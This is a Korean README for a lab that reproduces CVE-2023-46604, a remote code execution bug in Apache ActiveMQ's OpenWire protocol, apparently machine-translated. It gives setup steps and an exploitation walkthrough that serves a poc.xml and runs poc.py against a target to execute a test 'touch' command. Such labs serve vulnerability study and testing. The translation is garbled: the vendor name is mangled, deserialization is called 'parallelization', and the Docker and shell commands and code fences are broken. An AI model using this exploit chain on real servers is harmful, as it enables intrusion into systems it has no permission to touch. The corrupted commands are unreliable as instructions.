# Apache ActiveMQ OpenWire 프로토콜 병렬화 RCE(CVE-2023-46604)

[中文版本(중국어판)] (README.zh-cn.md )

Apache ActiveMQ는 미국 Pachitea(Apache) 소프트웨어 재단에서 개발한 오픈 소스 메시징 미들웨어로 자바 메시징 서비스, 클러스터링, 스프링 프레임워크 등을 지원합니다.

OpenWire 프로토콜은 ActiveMQ에서 여러 다른 언어 및 플랫폼에서 ActiveMQ에 대한 네이티브 액세스를 허용하도록 설계되었습니다. Apache ActiveMQ 5.18.2 이전 버전은 역직렬화 취약성의 영향을 받았습니다. 이 취약성은 네트워크 액세스 권한을 가진 원격 공격자가 OpenWire 프로토콜의 직렬화된 클래스 유형을 조작하여 임의의 셸 명령을 실행하여 에이전트의 클래스 경로에 있는 모든 클래스를 인스턴스화할 수 있도록 할 수 있습니다.

참조:

- <https://activemq.apache.org/news/cve-2023-46604 >
- <https://xz.aliyun.com/t/12929 >
- <https://boogipop.com/2023/11/03/Apache%20ActiveMQ%20CVE-2023-46604%20RCE%20%E5%88%86%E6%9E%90/ >
- <https://forum.butian.net/share/2566 >

## 환경설정

ActiveMQ는 다음 2개의 포트를 수신합니다:

| 기본 포트 | 기본 조건 |
|--------------|--------------------------------------|
| 8161(웹) | 원격접속은 구성이 필요합니다 |
| 61616(tcp) | 원격 접근 허용 |

포트 61616에 병렬화 문제가 있습니다.

ActiveMQ 5.17.3 서버를 실행하려면 다음 명령을 입력합니다:

```
도커 컴포지트 -d
```

61616번 포트만 사용하면 되지만 악용 전에 서비스가 성공적으로 시작되었는지 확인하려면 http://your-ip:8161에 접속하십시오.

## 악용

Python3 http.server 모듈을 사용하여 [poc.xml](poc.xml) 파일이 있는 폴더에서 HTTP 서버를 빠르게 시작할 수 있습니다:

'''조개
python3 -m http.server 6666
```

그런 다음 [poc.py ](poc.py )을 실행합니다:

'''조개
python3 poc.py 대상 포트 http server/poc.xml의 http://ip
```

다음 명령을 사용하여 ActiveMQ 컨테이너 내부를 확인할 수 있습니다:

```
docker exec cve-2023-46604-activemq-1 ls -l /tmp
```

touch /tmp/activeMQ-RCE-success가 성공적으로 실행되었음을 나타내는 출력이 표시되면 악용이 작동했습니다.

![01.png](01.png)